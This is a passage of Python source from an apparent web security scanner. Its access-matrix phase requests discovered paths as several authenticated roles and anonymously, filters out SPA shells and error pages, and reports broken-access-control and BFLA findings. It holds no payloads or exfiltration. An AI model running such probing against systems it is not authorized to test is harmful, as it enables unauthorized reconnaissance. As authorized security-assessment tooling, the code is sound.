_P20_BODY_DENIED_RE = re.compile(
    r'\b(?:'
    r'access\s+denied|(?:not|un)\s*authorized|forbidden'
    r'|you\s+do\s+not\s+have\s+(?:access|permission)'
    r'|insufficient\s+(?:permissions?|privileges?|access)'
    r'|error\s+403'
    r')\b', re.I)
_P20_LOGIN_FORM_RE = re.compile(
    r'<input[^>]+type=["\']?password["\']?'
    r'|id=["\'](?:js[-_])?login[-_]?(?:app|form|container|page|root)["\']'
    r'|id=["\'](?:signin|sign-in|auth)[-_]?(?:app|form|container|page|root)["\']'
    r'|data-(?:login|auth|signin)[-_](?:page|app|form)\b',
    re.I)
_P20_LOGIN_PATH_RE = re.compile(
    r'(?:^|/)(?:login|log[-_]in|signin|sign[-_]in|auth(?:enticate)?'
    r'|sso|cas|adfs'
    r'|login[-_](?:okta|saml|azure|sso|adfs|ping|auth0|onelogin|duo|cognito)'
    r')/?$', re.I)
# ── Per-request entropy normalization (CSP nonces, CSRF tokens) ──────────────
# Some SPAs embed a per-request 32-char hex CSP nonce in <meta>, <script>,
# and <style> tags.  This rotates every response, making every body hash unique
# even when the HTML structure is identical.  These regexes strip such entropy
# before hashing/comparing, so identical pages produce the same fingerprint.
_P20_NONCE_ATTR_RE = re.compile(
    r'(\bnonce=["\'"]?)[0-9a-fA-F]{24,64}')
_P20_CSP_META_RE = re.compile(
    r'(csp-nonce["\'"][^>]{0,80}content=["\'"])[0-9a-fA-F]{24,64}')
_P20_CSRF_TOKEN_RE = re.compile(
    r'(\bcsrf[-_]?token["\'":=\s]+)[0-9a-fA-F]{24,64}', re.I)
_P20_VIEWSTATE_RE = re.compile(
    r'(__VIEWSTATE[^>]*value=["\'"])[A-Za-z0-9+/=]{32,}')
_P20_SRI_RE = re.compile(
    r'(\bintegrity=["\'"])sha\d+-[A-Za-z0-9+/=]{20,}(?:\s+sha\d+-[A-Za-z0-9+/=]{20,})*')
_P20_INLINE_STATE_RE = re.compile(
    r'(<script[^>]*>\s*(?:window\.__\w+|window\.\w+_STATE|__NEXT_DATA__'
    r'|window\.(?:__)?(?:APP|INITIAL|PRELOADED|SERVER|RUNTIME|REDUX)[-_]?\w*'
    r'|self\.__next_f\.push)\s*=?\s*(?:\(?\[?))\{[^<]{0,8000}\}')
_P20_SCRIPT_ID_STATE_RE = re.compile(
    r'(<script[^>]*\bid=["\']__\w+["\'][^>]*>)\{[^<]{0,8000}\}')

def _p20_normalize_body(body: str) -> str:
    """Strip per-request entropy from an HTML body for consistent comparison."""
    s = _P20_NONCE_ATTR_RE.sub(r'\1_NONCE_', body)
    s = _P20_CSP_META_RE.sub(r'\1_NONCE_', s)
    s = _P20_CSRF_TOKEN_RE.sub(r'\1_TOKEN_', s)
    s = _P20_VIEWSTATE_RE.sub(r'\1_VS_', s)
    s = _P20_SRI_RE.sub(r'\1_SRI_', s)
    s = _P20_INLINE_STATE_RE.sub(r'\1_STATE_', s)
    s = _P20_SCRIPT_ID_STATE_RE.sub(r'\1_STATE_', s)
    return s

def _p20_body_hash(body: str) -> str:
    """Hash body after stripping per-request entropy (CSP nonces etc.)."""
    return hashlib.md5(
        _p20_normalize_body(body).encode("utf-8", "replace")).hexdigest()


def _phase_access_matrix(target: dict, cfg: dict, pm: ProgressManager,
                          out: OutputManager, sess: requests.Session,
                          crawl_data: dict,
                          prebuilt_sessions: "dict | None" = None,
                          landing_urls: "dict | None" = None) -> dict:
    """
    Phase 20: Multi-credential access matrix: tests each discovered path with
    every role in cfg['auth_matrix'] plus unauthenticated.
    Sources paths from structure_map.json (all gobuster/crawl discovered paths).
    Generates access_matrix.json, MEDIUM findings for unauth access,
    HIGH findings for BFLA (lower-priv accessing admin paths).

    prebuilt_sessions: {role_label: requests.Session} collected during the
    context loop. When provided, skips re-authentication entirely.
    """
    import copy as _copy

    phase       = "access_matrix"
    auth_matrix = cfg.get("auth_matrix", [])
    _pu20       = urllib.parse.urlparse(target["url"])
    base_url    = f"{_pu20.scheme}://{_pu20.netloc}"
    port        = target["port"]
    timeout     = cfg.get("timeout", 10)

    # Build per-role configs for re-authentication.  The global cfg contains
    # the first role's (usually Admin) credentials — re-authing Standard or
    # Limited with cfg authenticates them as Admin.  Each role needs its own
    # config with its own username/password.
    _role_cfgs: dict = {}
    for _rc in auth_matrix:
        _rc_role = _rc.get("role", "")
        _rc_auth = _copy.deepcopy(cfg.get("auth", {}))
        _rc_auth["enabled"]  = True
        _rc_auth["username"] = _rc.get("username", _rc_auth.get("username", ""))
        _rc_auth["password"] = _rc.get("password", _rc_auth.get("password", ""))
        _rc_cfg = _copy.deepcopy(cfg)
        _rc_cfg["auth"] = _rc_auth
        _role_cfgs[_rc_role] = _rc_cfg
    project_dir = out.root
    verify_ssl  = cfg.get("verify_ssl", False)

    # Build path list from structure_map.json (primary) + crawl_data links (supplemental)
    sm_path = out.root / "structure_map.json"
    _sm_path_keys: list = []
    try:
        _sm = json.loads(sm_path.read_text()) if sm_path.exists() else {}
        _sm_path_keys = sorted(_sm.get("paths", {}).keys())
    except Exception:
        pass
    _seen_paths: set = set(_sm_path_keys)
    for _lnk in crawl_data.get("links", []):
        _p = urllib.parse.urlparse(_lnk).path or "/"
        if _p not in _seen_paths:
            _seen_paths.add(_p)
            _sm_path_keys.append(_p)
    # Filter out static asset paths — these are public by design and testing
    # them wastes time + generates false-positive "Unauthenticated Access"
    # findings.  Reuses the _SPA_ROUTE_EXCLUDE pattern from the crawl phase
    # (covers .js, .css, .png, .jpg, .gif, .svg, .ico, .woff2, .ttf, .eot,
    # .map, .json, .xml, /static/, /assets/, /node_modules/, /favicon).
    _pre_filter_count = len(_sm_path_keys)
    crawled_paths = [p for p in _sm_path_keys if not _SPA_ROUTE_EXCLUDE.search(p)]
    _filtered_count = _pre_filter_count - len(crawled_paths)
    if _filtered_count:
        vc.log(f"[access-matrix/p20] Filtered {_filtered_count} static asset "
               f"path(s) from {_pre_filter_count} total", "INFO")

    # Only skip if truly no paths discovered anywhere
    if not crawled_paths:
        vc.status(phase, "Access Matrix", "complete", "No paths discovered — skipped", 0, 0)
        return {}

    vc.status(phase, "Access Matrix", "running", "Building role sessions", 0, 1)
    print(f"\n{'─'*60}")
    print(f"  Phase 20: Multi-Credential Access Matrix")
    print(f"{'─'*60}")

    role_sessions = {}
    _failed_auth_roles: set = set()   # roles where auth failed — results are unreliable
    if prebuilt_sessions:
        # Reuse sessions already authenticated during the context loop — no re-auth needed.
        for role_label, r_sess in prebuilt_sessions.items():
            if r_sess is None:
                _failed_auth_roles.add(role_label)
                r_sess = requests.Session()
                r_sess.verify = verify_ssl
                vc.log(f"[access-matrix] Auth failed for role '{role_label}' — "
                       f"results for this role may reflect unauthenticated access",
                       "WARNING")
            role_sessions[role_label] = r_sess
            print(f"  → Role '{role_label}' session reused (no re-authentication)")
    else:
        def _build_role_session(role_cfg: dict):
            r_auth = _copy.deepcopy(cfg.get("auth", {}))
            r_auth["enabled"]  = True
            r_auth["username"] = role_cfg.get("username", r_auth.get("username", ""))
            r_auth["password"] = role_cfg.get("password", r_auth.get("password", ""))
            r_cfg = _copy.deepcopy(cfg)
            r_cfg["auth"] = r_auth
            return _reauth_session(r_cfg, target, role_cfg.get("role", ""))

        for role_cfg in auth_matrix:
            role = role_cfg.get("role") or f"role{len(role_sessions)+1}"
            r_sess = _build_role_session(role_cfg)
            if r_sess is None:
                _failed_auth_roles.add(role)
                r_sess = requests.Session()
                r_sess.verify = verify_ssl
                vc.log(f"[access-matrix] Re-auth failed for role '{role}' — "
                       f"results for this role may reflect unauthenticated access",
                       "WARNING")
            role_sessions[role] = r_sess
            print(f"  → Role '{role}' session built (user: {role_cfg.get('username','?')})")

    # Build a truly clean unauthenticated session — no inherited cookies
    unauth_sess = requests.Session()
    unauth_sess.verify = verify_ssl
    unauth_sess.cookies.clear()
    role_sessions["unauthenticated"] = unauth_sess
    all_roles  = list(role_sessions.keys())
    cred_roles = [r for r in all_roles if r != "unauthenticated"]

    print(f"  Testing {len(crawled_paths)} paths × {len(all_roles)} roles")
    vc.status(phase, "Access Matrix", "running", f"Testing {len(crawled_paths)} paths", 0, len(crawled_paths))

    # ── Merge with existing per-role probed results ──────────────────────
    # _probe_role_paths (called at the end of each role's context) already
    # wrote correct HTTP codes while each role's session was still active.
    # Load those results so we don't re-probe with potentially stale
    # (expired) prebuilt sessions, overwriting good data with 302s.
    _existing_am = {}
    _existing_by_path: dict = {}
    try:
        _am_file = project_dir / "access_matrix.json"
        if _am_file.exists():
            _existing_am = json.loads(_am_file.read_text())
            _existing_by_path = {
                e["path"]: e.get("access", {})
                for e in _existing_am.get("paths", [])
            }
    except Exception:
        pass

    # ── Canary + re-auth for each authenticated role ─────────────────────
    # Targets with aggressive idle timeouts (e.g. 60 s) may have expired
    # the prebuilt sessions.  Detect by probing a known-200 path; rebuild
    # if it returns a redirect.
    _sm_paths_data: dict = {}
    try:
        _sm_paths_data = json.loads(sm_path.read_text()).get("paths", {}) if sm_path.exists() else {}
    except Exception:
        pass
    _P20_CANARY_SKIP = frozenset({"/", "/robots.txt", "/sitemap.xml",
                                    "/favicon.ico", "/index.html"})
    # ── SPA landing-page baseline (per role) ──────────────────────────────
    # Detect SPA-public landing URLs that return 200 regardless of auth
    # state — see _probe_role_paths for the full explanation.
    _p20_spa_public: dict = {}  # {role: True/False}
    import hashlib as _p20_hl
    for _sp_role in cred_roles:
        _sp_landing = (landing_urls or {}).get(_sp_role, "")
        _sp_sess    = role_sessions.get(_sp_role)
        if not _sp_landing or _sp_sess is None:
            continue
        try:
            _sp_ar = _sp_sess.get(
                _sp_landing, timeout=timeout, allow_redirects=False,
                headers={"Accept": "text/html,application/json"})
            if _sp_ar.status_code == 200:
                _sp_us = requests.Session()
                _sp_us.verify = verify_ssl
                _sp_ur = _sp_us.get(
                    _sp_landing, timeout=timeout, allow_redirects=False,
                    headers={"Accept": "text/html,application/json"})
                if _sp_ur.status_code == 200:
                    _sp_ah = _p20_body_hash((_sp_ar.text or "").strip())
                    _sp_uh = _p20_body_hash((_sp_ur.text or "").strip())
                    if _sp_ah == _sp_uh:
                        _p20_spa_public[_sp_role] = True
                        vc.log(
                            f"[access-matrix/p20] {_sp_role} landing URL "
                            f"is SPA-public — cross-checks disabled", "INFO")
        except Exception:
            pass

    for _cr_role in cred_roles:
        _cr_sess = role_sessions.get(_cr_role)
        if _cr_sess is None:
            continue
        _canary_p = None
        # Prefer a deep (auth-gated) path — skip public pages like /
        for _cp, _ci in _sm_paths_data.items():
            if (isinstance(_ci, dict) and _ci.get("status") == 200
                    and _cp not in _P20_CANARY_SKIP
                    and _cp.count("/") >= 2):
                _canary_p = _cp
                break
        if _canary_p is None:
            for _cp, _ci in _sm_paths_data.items():
                if (isinstance(_ci, dict) and _ci.get("status") == 200
                        and _cp not in _P20_CANARY_SKIP):
                    _canary_p = _cp
                    break
        if _canary_p is None and crawled_paths:
            _canary_p = crawled_paths[0]
        if _canary_p:
            try:
                _cr_r = _cr_sess.get(
                    base_url + _canary_p, timeout=timeout, allow_redirects=False,
                    headers={"Accept": "text/html,application/json"})
                if _cr_r.status_code in (301, 302, 303, 307, 308):
                    # Cross-check: canary may be role-gated (admin-only),
                    # not actually expired.  Verify with the role's own
                    # landing URL before burning a re-auth.
                    # SKIP when SPA-public — 200 proves nothing.
                    _cr_actually_dead = True
                    _cr_landing = (landing_urls or {}).get(_cr_role, "")
                    if _cr_landing and not _p20_spa_public.get(_cr_role):
                        try:
                            _cr_lr = _cr_sess.get(
                                _cr_landing, timeout=timeout,
                                allow_redirects=False,
                                headers={"Accept": "text/html,application/json"})
                            if _cr_lr.status_code in range(200, 400) and _cr_lr.status_code not in (301, 302, 303, 307, 308):
                                _cr_actually_dead = False
                                vc.log(
                                    f"[access-matrix/p20] {_cr_role} canary "
                                    f"{_canary_p} → {_cr_r.status_code} but "
                                    f"landing page → {_cr_lr.status_code} — "
                                    f"session alive, canary is role-gated", "INFO")
                        except Exception:
                            pass
                    if _cr_actually_dead:
                        vc.log(
                            f"[access-matrix/p20] {_cr_role} session expired "
                            f"(canary {_canary_p} → HTTP {_cr_r.status_code}) "
                            f"— re-authenticating", "WARNING")
                        try:
                            _cr_fresh = _reauth_session(
                                _role_cfgs.get(_cr_role, cfg), target, _cr_role)
                            if _cr_fresh is not None:
                                role_sessions[_cr_role] = _cr_fresh
                                vc.log(f"[access-matrix/p20] {_cr_role} re-authenticated OK", "INFO")
                            else:
                                vc.log(
                                    f"[access-matrix/p20] {_cr_role} re-auth returned None", "WARNING")
                        except Exception as _cr_e:
                            vc.log(
                                f"[access-matrix/p20] {_cr_role} re-auth failed: {_cr_e}", "WARNING")
            except Exception:
                pass

    # Use a growable list so redirect destinations discovered during probing
    # are appended and probed in the same pass (one level of expansion only;
    # destinations that themselves redirect are recorded but not followed further).
    _am_paths = list(crawled_paths)
    _am_seen  = set(crawled_paths)    # dedup set — paths already in the list
    path_access = []
    idx = 0
    _p20_reauth_budget: dict = {r: 5 for r in cred_roles}  # per-role mid-loop re-auth budget
    _p20_reauth_dead:  dict = {r: False for r in cred_roles}
    _P20_LOGIN_LOC_RE = re.compile(r'/login|/signin|/sign-in|/auth|/sso', re.I)

    # ── Response body classification ──────────────────────────────────────
    # Bare status codes are unreliable on SPAs and apps that return 200 for
    # everything.  Capture a baseline body hash (unauthenticated GET to root)
    # and classify every 200 response:
    #   unique       — body hash differs from baseline AND no error indicators
    #   spa_shell    — body hash matches unauth baseline (same HTML for everyone)
    #   catchall     — body hash matches baseline AND path is NOT the root
    #   soft_404     — body contains "not found" / "page not found" / "404"
    #   error_page   — body contains "error" / "exception" / "server error"
    #   access_denied— body contains "denied" / "forbidden" / "unauthorized"
    #   login_form   — body contains a password input field
    #   empty        — body length < 50 bytes
    import hashlib as _p20_hl
    _P20_BODY_ERR_RE = re.compile(
        r'\b(?:'
        r'(?:page|resource|file)\s+(?:not\s+found|does\s+not\s+exist)'
        r'|(?:404|not\s+found)\s*[-—:]'
        r'|error\s+404'
        r'|the\s+resource\s+(?:you\s+requested\s+)?(?:could\s+not\s+be|cannot\s+be|was\s+not)\s+found'
        r')\b', re.I)
    _P20_BODY_ERR_GENERIC_RE = re.compile(
        r'\b(?:'
        r'(?:server|internal|application|unexpected|unhandled)\s+error'
        r'|something\s+went\s+wrong'
        r'|an?\s+error\s+(?:has\s+)?occurred'
        r'|exception\s+(?:of\s+type|details|message|was\s+thrown)'
        r'|error\s+500'
        r')\b', re.I)
    # _P20_*_RE patterns are module-level (defined above _phase_access_matrix)
    # so both _phase_access_matrix and _phase_bfla can use them.
    # Capture baselines: unauth body hash + per-role body hash for root path
    _p20_baseline_hashes: set = set()
    # Probe root and nonexistent paths with BOTH redirect modes.
    # Per-path probes use allow_redirects=False; mismatched redirect
    # behaviour between baseline and per-path probes causes SPAs to
    # produce different hashes → false "unique" classifications.
    _bl_probes = [
        "/",
        "/nonexistent-path-" + str(int(time.time())),
        "/fracture_nonexistent_path_404_test",
    ]
    for _bl_probe in _bl_probes:
        for _bl_redir in (True, False):
            try:
                _bl_r = unauth_sess.get(
                    base_url + _bl_probe, timeout=timeout,
                    allow_redirects=_bl_redir,
                    headers={"Accept": "text/html,application/json"})
                if _bl_r.status_code == 200:
                    _bl_body = (_bl_r.text or "").strip()
                    _bl_h = _p20_body_hash(_bl_body)
                    if _bl_h:
                        _p20_baseline_hashes.add(_bl_h)
            except Exception:
                pass

    # URL path patterns that indicate an error/catch-all page.  SPAs render
    # error content client-side so the server HTML shell has no error markers —
    # the URL itself is the only signal.
    _P20_ERROR_PATH_RE = re.compile(
        r'(?i)(?:^|/)'
        r'(?:error[\-_]?page|errorpage|error\.aspx|error\.html|'
        r'(?:custom[\-_]?)?error(?:[\-_]handler)?)'
        r'(?:[/\-_?#.]|$)'
    )

    def _classify_response(resp, rel_path: str) -> "tuple[str, str]":
        """Classify a 200 response body beyond the bare status code.

        Returns (classification, body_hash).  The body_hash is the MD5 of
        the stripped response body; empty string when the body is too short
        to fingerprint or classification was determined by URL pattern alone.
        """
        body = (resp.text or "").strip()
        if len(body) < 50:
            return ("empty", "")
        # URL-path heuristic: paths whose final segment IS a login endpoint
        # should never be flagged as real access — SPAs render the form via
        # JS so the static HTML won't contain <input type=password>.
        if _P20_LOGIN_PATH_RE.search(rel_path):
            return ("login_form", "")
        # URL-path heuristic: paths that ARE error pages or route through
        # an error handler (e.g. /omt/ErrorPage.aspx/anything).  SPAs
        # render error content client-side — the raw HTML shell has no
        # body markers, so the URL is the only reliable signal.
        if _P20_ERROR_PATH_RE.search(rel_path):
            return ("error_page", "")
        body_hash = _p20_body_hash(body)
        # Strip tags for text matching
        visible = re.sub(r'<[^>]+>', ' ', body[:8000])
        if _P20_LOGIN_FORM_RE.search(body[:8000]):
            return ("login_form", body_hash)
        if _P20_BODY_DENIED_RE.search(visible):
            return ("access_denied", body_hash)
        if _P20_BODY_ERR_RE.search(visible):
            return ("soft_404", body_hash)
        if _P20_BODY_ERR_GENERIC_RE.search(visible):
            return ("error_page", body_hash)
        if _matches_error_fingerprint(body):
            return ("error_page", body_hash)
        if body_hash in _p20_baseline_hashes:
            return ("spa_shell", body_hash)
        return ("unique", body_hash)

    while idx < len(_am_paths):
        path = _am_paths[idx]
        idx += 1
        if path.startswith("http"):
            url = path
            rel = urllib.parse.urlparse(path).path or "/"
        else:
            rel = path if path.startswith("/") else "/" + path
            url = base_url + rel
        access = {}
        body_class = {}
        _body_hash_map = {}
        _prior = _existing_by_path.get(rel, {})
        for role, r_sess in role_sessions.items():
            _prior_code = _prior.get(role)
            if isinstance(_prior_code, int) and _prior_code > 0:
                access[role] = _prior_code
                continue
            try:
                r = r_sess.get(url, timeout=timeout, allow_redirects=False,
                               headers={"Accept": "text/html,application/json"})
                access[role] = r.status_code
                if r.status_code == 200:
                    _cls_result, _cls_hash = _classify_response(r, rel)
                    body_class[role] = _cls_result
                    if _cls_hash:
                        _body_hash_map[role] = _cls_hash

                # ── Mid-loop session expiry detection ─────────────
                # SKIP for SPA-public roles (see _probe_role_paths comment).
                if (r.status_code in (301, 302, 303, 307, 308)
                        and role != "unauthenticated"
                        and _p20_reauth_budget.get(role, 0) > 0
                        and not _p20_reauth_dead.get(role)
                        and not _p20_spa_public.get(role)):
                    _loc20 = r.headers.get("Location", "") or ""
                    if _P20_LOGIN_LOC_RE.search(_loc20):
                        # ── Landing URL cross-check ────────────────────
                        # Before burning re-auth budget, verify the session
                        # is actually dead by probing the role's known-good
                        # landing URL.  If it returns non-redirect, the
                        # session is alive — the path is role-gated (e.g.
                        # DocLib has its own /Login.aspx that redirects
                        # users without DocLib access).
                        _p20_role_landing = (landing_urls or {}).get(role, "")
                        _p20_landing_alive = False
                        if _p20_role_landing and not _p20_spa_public.get(role):
                            try:
                                _p20_lr = r_sess.get(
                                    _p20_role_landing, timeout=timeout,
                                    allow_redirects=False,
                                    headers={"Accept": "text/html,application/json"})
                                if _p20_lr.status_code not in (301, 302, 303, 307, 308):
                                    _p20_landing_alive = True
                                    vc.log(
                                        f"[access-matrix/p20] {role} session alive "
                                        f"(landing URL → {_p20_lr.status_code}), "
                                        f"path {rel} is role-gated — not re-authenticating",
                                        "INFO")
                            except Exception:
                                pass
                        if not _p20_landing_alive:
                            _p20_reauth_budget[role] = _p20_reauth_budget.get(role, 0) - 1
                            vc.log(
                                f"[access-matrix/p20] {role} session expired mid-loop "
                                f"({rel} → {r.status_code}) — re-authenticating",
                                "WARNING")
                            try:
                                _p20_fresh = _reauth_session(
                                    _role_cfgs.get(role, cfg), target, role)
                                if _p20_fresh is not None:
                                    role_sessions[role] = _p20_fresh
                                    r_sess = _p20_fresh
                                    vc.log(f"[access-matrix/p20] {role} re-authenticated OK", "INFO")
                                    r = r_sess.get(
                                        url, timeout=timeout, allow_redirects=False,
                                        headers={"Accept": "text/html,application/json"})
                                    access[role] = r.status_code
                                    # Bail if retry still fails — re-auth cannot
                                    # produce a valid session for this target.
                                    if r.status_code in (301, 302, 303, 307, 308):
                                        _rl20 = r.headers.get("Location", "") or ""
                                        if _P20_LOGIN_LOC_RE.search(_rl20):
                                            # Cross-check again before declaring dead
                                            _p20_retry_alive = False
                                            if _p20_role_landing and not _p20_spa_public.get(role):
                                                try:
                                                    _p20_rr = r_sess.get(
                                                        _p20_role_landing, timeout=timeout,
                                                        allow_redirects=False,
                                                        headers={"Accept": "text/html,application/json"})
                                                    if _p20_rr.status_code not in (301, 302, 303, 307, 308):
                                                        _p20_retry_alive = True
                                                        vc.log(
                                                            f"[access-matrix/p20] {role} session alive "
                                                            f"after re-auth (landing → {_p20_rr.status_code}), "
                                                            f"path {rel} is role-gated",
                                                            "INFO")
                                                except Exception:
                                                    pass
                                            if not _p20_retry_alive:
                                                _p20_reauth_dead[role] = True
                                                _p20_reauth_budget[role] = 0
                                                vc.log(
                                                    f"[access-matrix/p20] {role} re-auth produced "
                                                    f"a dead session (retry → {r.status_code}) — "
                                                    f"skipping remaining probes",
                                                    "WARNING")
                            except Exception as _p20e:
                                vc.log(
                                    f"[access-matrix/p20] {role} mid-loop re-auth "
                                    f"failed: {_p20e}", "WARNING")

                # Guard: don't record login-redirect as real status when
                # re-auth is exhausted or dead.
                if (r.status_code in (301, 302, 303, 307, 308)
                        and role != "unauthenticated"
                        and (_p20_reauth_dead.get(role) or _p20_reauth_budget.get(role, 0) <= 0)):
                    _g20_loc = r.headers.get("Location", "") or ""
                    if _P20_LOGIN_LOC_RE.search(_g20_loc):
                        access[role] = None  # not tested — don't corrupt

                # Collect redirect destination so the resolved URL is also probed.
                if r.status_code in (301, 302, 303, 307, 308):
                    _loc = r.headers.get("Location", "").strip()
                    if _loc:
                        _dest = urllib.parse.urljoin(url, _loc)
                        _dest_parsed = urllib.parse.urlparse(_dest)
                        _dest_netloc = _dest_parsed.netloc
                        _base_netloc = urllib.parse.urlparse(base_url).netloc
                        if _dest_netloc == _base_netloc:
                            _dest_path = _dest_parsed.path or "/"
                            if _dest_path not in _am_seen:
                                _am_seen.add(_dest_path)
                                _am_paths.append(_dest_path)
            except Exception:
                try:
                    r = r_sess.head(url, timeout=max(timeout // 2, 3),
                                    allow_redirects=False)
                    access[role] = r.status_code
                except Exception:
                    access[role] = 0
        _pa_entry = {"path": rel, "url": url, "access": access}
        if body_class:
            _pa_entry["body_class"] = body_class
        if _body_hash_map:
            _pa_entry["body_hash"] = _body_hash_map
        path_access.append(_pa_entry)
        vc.status(phase, "Access Matrix", "running", f"Path {idx}/{len(_am_paths)}", idx, len(_am_paths))

    # ── Per-directory SPA catch-all detection ────────────────────────────
    # The root-level baseline (/ and /nonexistent-*) catches server-wide
    # SPAs.  Multi-app deployments often have SEPARATE SPA shells per route
    # prefix (e.g. /receipt/*, /results/*, /portal/*) — each returns a
    # different HTML shell from the root, so the root baseline misses them.
    #
    # Group probed paths by parent directory.  For any parent where ≥ N
    # paths returned HTTP 200 with the SAME body hash (not already in the
    # root baseline), probe the parent with random sub-paths.  If random
    # probes also return 200 with the same hash → confirmed per-directory
    # SPA catch-all → reclassify all matching paths as spa_shell.
    _AM_DIR_WC_THRESHOLD = 3
    from collections import defaultdict as _dd_am
    _dir_hash_groups: dict = _dd_am(lambda: _dd_am(list))
    for _dix, _dep in enumerate(path_access):
        _dpath = _dep.get("path", "/")
        _dparts = _dpath.rstrip("/").rsplit("/", 1)
        _dparent = _dparts[0] if (len(_dparts) > 1 and _dparts[0]) else "/"
        for _drole, _dhash in _dep.get("body_hash", {}).items():
            if _dhash and _dep.get("body_class", {}).get(_drole) == "unique":
                _dir_hash_groups[(_dparent, _drole)][_dhash].append(_dix)

    _p20_dir_catchall_hashes: set = set()
    _p20_dir_wc_total = 0
    for (_dparent, _drole), _hash_buckets in _dir_hash_groups.items():
        for _dhash, _dindices in _hash_buckets.items():
            if len(_dindices) < _AM_DIR_WC_THRESHOLD:
                continue
            if _dhash in _p20_baseline_hashes:
                continue
            if _dhash in _p20_dir_catchall_hashes:
                for _dix in _dindices:
                    path_access[_dix].setdefault("body_class", {})[_drole] = "spa_shell"
                _p20_dir_wc_total += len(_dindices)
                continue
            # Probe: random sub-paths under this parent directory
            _probe_hits = 0
            _probe_sess = role_sessions.get(_drole, unauth_sess)
            for _ in range(3):
                _probe_slug = secrets.token_hex(10) + "-notfound"
                _probe_path = _dparent.rstrip("/") + "/" + _probe_slug
                try:
                    _pr = _probe_sess.get(
                        base_url + _probe_path, timeout=timeout,
                        allow_redirects=False,
                        headers={"Accept": "text/html,application/json"})
                    if _pr.status_code == 200:
                        _pr_body = (_pr.text or "").strip()
                        _pr_hash = _p20_body_hash(_pr_body)
                        if _pr_hash == _dhash:
                            _probe_hits += 1
                except Exception:
                    pass
            if _probe_hits >= 2:
                _p20_dir_catchall_hashes.add(_dhash)
                _p20_baseline_hashes.add(_dhash)
                vc.log(
                    f"[access-matrix/p20] Per-directory SPA catch-all: "
                    f"{_dparent}/* (role={_drole}, {len(_dindices)} matching "
                    f"paths, hash={_dhash[:8]}…) — reclassifying as spa_shell",
                    "INFO")
                for _dix in _dindices:
                    path_access[_dix].setdefault("body_class", {})[_drole] = "spa_shell"
                _p20_dir_wc_total += len(_dindices)

    if _p20_dir_wc_total:
        vc.log(
            f"[access-matrix/p20] Per-directory SPA detection reclassified "
            f"{_p20_dir_wc_total} path(s) across "
            f"{len(_p20_dir_catchall_hashes)} catch-all director(y/ies)",
            "INFO")

    # Body classes that do NOT represent genuine access — status 200 is
    # misleading; the page is a SPA shell, catchall, error, or login form.
    _NOT_REAL_ACCESS = frozenset({
        "catchall", "spa_shell", "soft_404", "error_page",
        "access_denied", "login_form", "empty",
    })

    def _ok(status, role=None, ep=None):
        """True when status is 2xx AND body classification confirms real access."""
        if not (isinstance(status, int) and status in (200, 201, 202, 204)):
            return False
        if ep is not None and role is not None:
            bc = ep.get("body_class", {}).get(role, "unique")
            if bc in _NOT_REAL_ACCESS:
                return False
        return True

    privilege_counts = {
        role: sum(1 for ep in path_access if _ok(ep["access"].get(role), role, ep))
        for role in all_roles
    }
    most_privileged = (
        max(cred_roles, key=lambda r: privilege_counts[r]) if cred_roles else None
    )
    print(f"  Most privileged: {most_privileged} ({privilege_counts.get(most_privileged, 0)} paths)")

    for ep in path_access:
        ep_access   = ep["access"]
        unauth_st   = ep_access.get("unauthenticated")
        any_authed  = any(_ok(ep_access.get(r), r, ep) for r in cred_roles)

        if _ok(unauth_st, "unauthenticated", ep) and any_authed:
            _ep_lower = (ep.get("path") or "").lower().rstrip("/")
            # Root path is always public — every site serves / to
            # unauthenticated users (SPA shell, landing page, etc.)
            if not _ep_lower or _ep_lower == "/":
                continue
            # Skip login/auth pages — they are expected to be publicly
            # accessible and are not missing access control.
            if _P20_LOGIN_PATH_RE.search(_ep_lower):
                continue
            # Defence in depth: skip error-page URLs even if body
            # classification missed them (SPA shell hides error markers).
            if _P20_ERROR_PATH_RE.search(_ep_lower):
                continue
            # Skip static assets — favicons, stylesheets, JS bundles,
            # images, fonts, robots.txt etc. are expected to be public.
            if _SPA_ROUTE_EXCLUDE.search(_ep_lower):
                continue
            if re.search(r'robots\.txt$|sitemap\.xml$|apple-touch-icon'
                         r'|browserconfig\.xml$|manifest\.json$'
                         r'|\.webmanifest$'
                         r'|service-?worker\.js$|sw\.js$', _ep_lower):
                continue
            # Skip intentionally-public pages — registration, legal,
            # password recovery, etc. are expected to be accessible
            # without authentication.
            if re.search(
                r'(?:^|/)(?:create[-_]?account|sign[-_]?up|register'
                r'|forgot[-_]?password|reset[-_]?password|password[-_]?reset'
                r'|eula|terms(?:[-_]of[-_](?:service|use))?'
                r'|privacy(?:[-_]policy)?|legal|tos|gdpr|cookie[-_]?policy'
                r'|accessibility|help|support|contact(?:[-_]us)?'
                r'|about(?:[-_]us)?|faq)/?$',
                _ep_lower,
            ):
                continue
            _unauth_ev = ""
            try:
                _safe_ep = re.sub(r'[^a-zA-Z0-9_-]', '_', ep['path'])[:40]
                _unauth_path = out.output_path("auth_walk",
                    f"unauth_access_{_safe_ep}")
                _unauth_lines = [f"URL: {ep['url']}",
                    f"Unauthenticated: HTTP {unauth_st}"]
                for _r in cred_roles:
                    _unauth_lines.append(f"Role '{_r}': HTTP {ep_access.get(_r)}")
                _unauth_path.write_text("\n".join(_unauth_lines), encoding="utf-8")
                _unauth_ev = str(_unauth_path)
            except Exception:
                pass
            _authed_roles = [r for r in cred_roles if _ok(ep_access.get(r), r, ep)]
            out.add_finding(
                title="Unauthenticated Access to Protected Path",
                url=ep["url"], port=port, risk="MEDIUM",
                description=(
                    f"Path {ep['path']} returned HTTP {unauth_st} without "
                    f"authentication but returns 2xx when authenticated. "
                    f"Missing or insufficient access control."
                ),
                output=f"URL: {ep['url']} | Unauth: HTTP {unauth_st}",
                command=f"GET {ep['url']} (no auth)",
                output_file=_unauth_ev,
                affected=ep["url"],
                owasp="A01:2021 Broken Access Control", nist="AC-3",
                remediation="Enforce authentication middleware on all non-public routes.",
                roles=", ".join(["unauthenticated"] + sorted(_authed_roles)),
            )

        if most_privileged and len(cred_roles) > 1:
            high_ok = _ok(ep_access.get(most_privileged), most_privileged, ep)
            if high_ok:
                # Skip BFLA on paths where unauthenticated also has real
                # access — the path is public, no privilege to escalate.
                if _ok(unauth_st, "unauthenticated", ep):
                    continue
                # ── Hierarchy-aware differential access check ─────────
                # Roles are ranked by privilege_counts (number of
                # accessible paths): more paths = more privilege.  In a
                # tiered RBAC model (e.g. Admin > Standard > Limited),
                # Standard having access to something Limited cannot is
                # EXPECTED — not BFLA.
                #
                # TRUE BFLA occurs when:
                #   a) A role has access to a path that a HIGHER-privilege
                #      role (other than most_privileged) is DENIED, or
                #   b) The path looks genuinely admin-only (keyword
                #      match) AND only admin can access it — but a lower
